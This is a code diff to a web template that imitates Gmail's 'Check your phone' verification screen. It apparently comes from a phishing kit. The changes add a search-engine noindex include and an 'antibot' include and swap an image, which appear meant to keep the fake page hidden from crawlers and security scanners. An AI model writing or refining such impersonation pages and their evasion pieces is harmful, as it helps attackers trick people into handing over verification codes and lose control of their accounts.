@@ -1,10 +1,12 @@
 
+
 <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Gmail</title>
+      <%- include('partials/meta-noindex') %>
       <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
       <link rel="stylesheet" href="/css/newstylepn.css">
       <script type="text/javascript" src="/JS/fetchtap.js"></script>
@@ -35,7 +37,7 @@
               </div>
               <div class="form-half1">
                   <center>
-                    <div class="gradient-box"><img src="/image/nc.gif"></div>
+                    <div class="gradient-box"><img src="/image/1.gif"></div>
                 </center>
                       <div class="phonediv">
                         <span class="phonetype">Check your <%= mtype %></span><br><br>
@@ -137,5 +139,6 @@
   
       </div>
       
+  <%- include('partials/antibot') %>
   </body>
   </html>
